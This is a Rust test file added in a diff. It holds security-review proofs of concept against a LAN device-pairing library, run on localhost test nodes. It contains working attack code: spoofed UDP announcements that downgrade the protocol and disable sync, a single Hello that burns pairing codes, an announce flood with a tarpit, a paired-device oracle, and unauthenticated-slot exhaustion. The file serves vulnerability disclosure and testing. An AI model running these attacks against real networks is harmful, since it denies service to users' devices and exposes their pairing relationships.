@@ -1,0 +1,321 @@
+//! Security review PoCs: an UNPAIRED LAN host (no key, no pin, no code) against real nodes.
+//! Timing is the fast test profile; production uses the same code paths with a 10 s step.
+
+mod support;
+
+use std::net::{TcpListener, TcpStream, UdpSocket};
+use std::sync::Arc;
+use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
+use std::time::{Duration, Instant};
+
+use device_link::discovery::encode_announce;
+use device_link::identity::DeviceId;
+use device_link::wire::{HelloKind, HelloVersion, hello};
+use device_link_net::PairStartError;
+use device_link_net::framed::write_frame;
+use support::{Options, TestNode, free_port, pair, start, wait_for};
+
+/// Two paired nodes restarted on new ports: they hold each other's pins but only find each
+/// other when an announcement arrives (we play the real announcements by hand).
+fn partitioned(seed: u8) -> (TestNode, TestNode) {
+    let a0 = start(seed, "A", Options::default());
+    let b0 = start(seed + 1, "B", Options::default());
+    pair(&a0, &b0);
+    let (sa, sb) = (a0.store.clone(), b0.store.clone());
+    a0.node.stop();
+    b0.node.stop();
+    let a = start(
+        seed,
+        "A",
+        Options {
+            store: Some(sa),
+            ..Options::default()
+        },
+    );
+    let b = start(
+        seed + 1,
+        "B",
+        Options {
+            store: Some(sb),
+            ..Options::default()
+        },
+    );
+    (a, b)
+}
+
+fn udp() -> UdpSocket {
+    UdpSocket::bind(("127.0.0.1", 0)).unwrap()
+}
+
+fn announce(sock: &UdpSocket, to_discovery: u16, claimed: &DeviceId, port: u16) {
+    let _ = sock.send_to(&encode_announce(claimed, port), ("127.0.0.1", to_discovery));
+}
+
+/// A TCP port run by the attacker. `hold`: keep sockets open (tarpit); else close at once.
+struct Tarpit {
+    port: u16,
+    accepted: Arc<AtomicUsize>,
+    stop: Arc<AtomicBool>,
+}
+
+fn tarpit(hold: bool) -> Tarpit {
+    let port = free_port();
+    let listener = TcpListener::bind(("127.0.0.1", port)).unwrap();
+    listener.set_nonblocking(true).unwrap();
+    let accepted = Arc::new(AtomicUsize::new(0));
+    let stop = Arc::new(AtomicBool::new(false));
+    let (c, s) = (accepted.clone(), stop.clone());
+    std::thread::spawn(move || {
+        let mut held = Vec::new();
+        while !s.load(Ordering::SeqCst) {
+            match listener.accept() {
+                Ok((stream, _)) => {
+                    c.fetch_add(1, Ordering::SeqCst);
+                    if hold {
+                        held.push(stream);
+                    }
+                }
+                Err(_) => std::thread::sleep(Duration::from_millis(1)),
+            }
+        }
+    });
+    Tarpit {
+        port,
+        accepted,
+        stop,
+    }
+}
+
+/// Plays one real announcement per side until the channel is up; returns the version.
+fn connect_for_real(a: &TestNode, b: &TestNode, sock: &UdpSocket) -> Option<HelloVersion> {
+    let up = wait_for(Duration::from_secs(6), || {
+        announce(sock, a.discovery_port, &b.id, b.peer_port);
+        announce(sock, b.discovery_port, &a.id, a.peer_port);
+        std::thread::sleep(Duration::from_millis(50));
+        a.node.channel_count() == 1 && b.node.channel_count() == 1
+    });
+    if up {
+        a.node.channel_version(&b.id)
+    } else {
+        None
+    }
+}
+
+#[test]
+fn control_without_attacker_the_channel_is_v3_and_syncs() {
+    let (a, b) = partitioned(10);
+    let sock = udp();
+    assert_eq!(connect_for_real(&a, &b, &sock), Some(HelloVersion::V3));
+    assert_eq!(a.node.sync_channels().len(), 1);
+    println!("[control] channel=V3 sync_channels=1");
+}
+
+/// FINDING: one UDP datagram plus one closed TCP connection disables sync for 24 hours.
+#[test]
+fn poc1_unauthenticated_downgrade_disables_sync_and_outlives_the_attacker() {
+    let (a, b) = partitioned(20);
+    let sock = udp();
+    let evil = tarpit(false);
+    assert_eq!(a.node.max_version(&b.id), HelloVersion::V3);
+    let started = Instant::now();
+    assert!(wait_for(Duration::from_secs(5), || {
+        announce(&sock, a.discovery_port, &b.id, evil.port);
+        announce(&sock, b.discovery_port, &a.id, evil.port);
+        std::thread::sleep(Duration::from_millis(20));
+        a.node.max_version(&b.id) == HelloVersion::V1
+            && b.node.max_version(&a.id) == HelloVersion::V1
+    }));
+    let took = started.elapsed();
+    let conns = evil.accepted.load(Ordering::SeqCst);
+    evil.stop.store(true, Ordering::SeqCst); // the attacker is gone from here on
+
+    let version = connect_for_real(&a, &b, &sock);
+    println!(
+        "[poc1] poisoned both sides in {took:?} with {conns} TCP accepts; attacker gone; \
+         real peers now connect at {version:?}; sync_channels={} (control: V3 / 1)",
+        a.node.sync_channels().len()
+    );
+    assert_eq!(version, Some(HelloVersion::V1), "real peers stuck on v1");
+    assert!(a.node.sync_channels().is_empty(), "sync silently off");
+    assert!(b.node.sync_channels().is_empty(), "sync silently off");
+}
+
+/// FINDING: a single pairing Hello kills the shown code; five of them lock pairing out.
+#[test]
+fn poc2_one_hello_burns_the_code_and_five_lock_pairing_out_for_ten_minutes() {
+    let a = start(30, "A", Options::default());
+    let b = start(31, "B", Options::default());
+    let started = Instant::now();
+    let mut burned = 0;
+    loop {
+        match a.node.start_pairing() {
+            Ok(()) => {}
+            Err(PairStartError::TooManyCodes) => break,
+            Err(other) => panic!("{other:?}"),
+        }
+        let code = a.node.snapshot().pairing.unwrap().code.unwrap();
+        // Attacker: Hello only. It never guessed anything.
+        let stream = TcpStream::connect(a.addr()).unwrap();
+        write_frame(&stream, &hello(HelloKind::Pairing)).unwrap();
+        drop(stream);
+        assert!(wait_for(Duration::from_secs(3), || {
+            a.node.snapshot().pairing.is_some_and(|p| p.state == "failed")
+        }));
+        burned += 1;
+        // The real device, holding the CORRECT code, cannot use it.
+        b.node.join(a.addr(), &code, Some(a.id)).unwrap();
+        assert!(wait_for(Duration::from_secs(5), || {
+            b.node.snapshot().join.is_some_and(|j| j.state == "failed")
+        }));
+        let reason = b.node.snapshot().join.unwrap().reason;
+        println!("[poc2] code {burned}: correct code refused for the real device: {reason:?}");
+        assert!(a.node.snapshot().paired.is_empty() && b.node.snapshot().paired.is_empty());
+    }
+    println!(
+        "[poc2] after {burned} one-packet attacks in {:?}: start_pairing = TooManyCodes",
+        started.elapsed()
+    );
+    assert_eq!(burned, 5);
+}
+
+/// FINDING: announce hints are not rate limited, so the tarpit wins the single dial slot.
+#[test]
+fn poc3_announce_flood_tarpit_keeps_paired_devices_apart() {
+    let (a, b) = partitioned(40);
+    let evil = tarpit(true);
+    let stop = Arc::new(AtomicBool::new(false));
+    let flood = {
+        let (s, ad, bd, aid, bid, port) = (
+            stop.clone(),
+            a.discovery_port,
+            b.discovery_port,
+            a.id,
+            b.id,
+            evil.port,
+        );
+        std::thread::spawn(move || {
+            let sock = udp();
+            let mut sent = 0u64;
+            while !s.load(Ordering::SeqCst) {
+                announce(&sock, ad, &bid, port);
+                announce(&sock, bd, &aid, port);
+                sent += 2;
+                std::thread::sleep(Duration::from_millis(2));
+            }
+            sent
+        })
+    };
+    let sock = udp();
+    // Both devices are offline to each other and already dialing the tarpit when they reappear.
+    assert!(wait_for(Duration::from_secs(3), || evil.accepted.load(Ordering::SeqCst) >= 2));
+    let started = Instant::now();
+    let (mut ever_up, mut real) = (false, 0);
+    while started.elapsed() < Duration::from_secs(8) {
+        announce(&sock, a.discovery_port, &b.id, b.peer_port);
+        announce(&sock, b.discovery_port, &a.id, a.peer_port);
+        real += 2;
+        std::thread::sleep(Duration::from_millis(300));
+        ever_up |= a.node.channel_count() > 0 || b.node.channel_count() > 0;
+    }
+    stop.store(true, Ordering::SeqCst);
+    let sent = flood.join().unwrap();
+    evil.stop.store(true, Ordering::SeqCst);
+    println!(
+        "[poc3] 8 s: flood={sent} datagrams, real={real} announcements, tarpit accepts={}, \
+         channel ever up={ever_up}",
+        evil.accepted.load(Ordering::SeqCst)
+    );
+    assert!(!ever_up, "the paired devices never found each other");
+    // Positive control: the moment the flood stops they connect, still at v3.
+    let version = connect_for_real(&a, &b, &sock);
+    println!("[poc3] flood stopped: channel up at {version:?}");
+    // Not asserted V3: closing the tarpit's held sockets itself triggers the poc1 downgrade.
+    assert!(version.is_some(), "connects once the flood stops");
+}
+
+/// FINDING: dialing back reveals which device ids are pinned (the pairing graph of the LAN).
+#[test]
+fn poc4_oracle_reveals_whether_a_device_id_is_paired() {
+    let (a, b) = partitioned(50);
+    let sock = udp();
+    let stranger = tarpit(true);
+    let unknown = DeviceId::from_bytes([0x77; 32]);
+    for _ in 0..20 {
+        announce(&sock, a.discovery_port, &unknown, stranger.port);
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    let for_unknown = stranger.accepted.load(Ordering::SeqCst);
+    let paired = tarpit(true);
+    assert!(wait_for(Duration::from_secs(3), || {
+        announce(&sock, a.discovery_port, &b.id, paired.port);
+        std::thread::sleep(Duration::from_millis(20));
+        paired.accepted.load(Ordering::SeqCst) > 0
+    }));
+    println!(
+        "[poc4] dial-backs: unknown id={for_unknown}, paired id={}",
+        paired.accepted.load(Ordering::SeqCst)
+    );
+    assert_eq!(for_unknown, 0);
+    stranger.stop.store(true, Ordering::SeqCst);
+    paired.stop.store(true, Ordering::SeqCst);
+}
+
+/// FINDING: 16 idle sockets from one IP fill the global unauthenticated limit.
+#[test]
+fn poc5_one_host_holds_every_unauthenticated_slot_and_blocks_inbound_channels() {
+    let (a, b) = partitioned(60);
+    let stop = Arc::new(AtomicBool::new(false));
+    let target = a.addr();
+    let attacker = {
+        let s = stop.clone();
+        std::thread::spawn(move || {
+            let mut conns: Vec<TcpStream> = Vec::new();
+            let mut opened = 0u64;
+            let mut probe = [0u8; 1];
+            while !s.load(Ordering::SeqCst) {
+                conns.retain(|c| {
+                    c.set_nonblocking(true).unwrap();
+                    !matches!(c.peek(&mut probe), Ok(0) | Err(_))
+                        || c.peek(&mut probe)
+                            .err()
+                            .is_some_and(|e| e.kind() == std::io::ErrorKind::WouldBlock)
+                });
+                if let Ok(c) = TcpStream::connect(target) {
+                    conns.push(c);
+                    opened += 1;
+                }
+                std::thread::sleep(Duration::from_millis(1));
+            }
+            opened
+        })
+    };
+    assert!(wait_for(Duration::from_secs(2), || a.node.unauthenticated()
+        >= 16));
+    let (mut ok, mut failed) = (0, 0);
+    let started = Instant::now();
+    let mut first_ok = None;
+    while started.elapsed() < Duration::from_secs(20) {
+        match b.node.ensure_channel(Some(a.id), Some(a.addr())) {
+            Ok(_) => {
+                ok += 1;
+                first_ok = Some(started.elapsed());
+                break;
+            }
+            Err(_) => failed += 1,
+        }
+        std::thread::sleep(Duration::from_millis(100));
+    }
+    println!(
+        "[poc5] while attacked (step timeout 1.5 s): failed dials={failed}, first success after {first_ok:?}, ok={ok}"
+    );
+    stop.store(true, Ordering::SeqCst);
+    let opened = attacker.join().unwrap();
+    println!("[poc5] attacker opened {opened} sockets from one IP over 8 s");
+    // Positive control: without the attacker the same call succeeds.
+    assert!(wait_for(Duration::from_secs(6), || b
+        .node
+        .ensure_channel(Some(a.id), Some(a.addr()))
+        .is_ok()));
+    println!("[poc5] attacker gone: ensure_channel succeeds");
+    assert!(failed >= 1, "the attack delays real dials");
+}
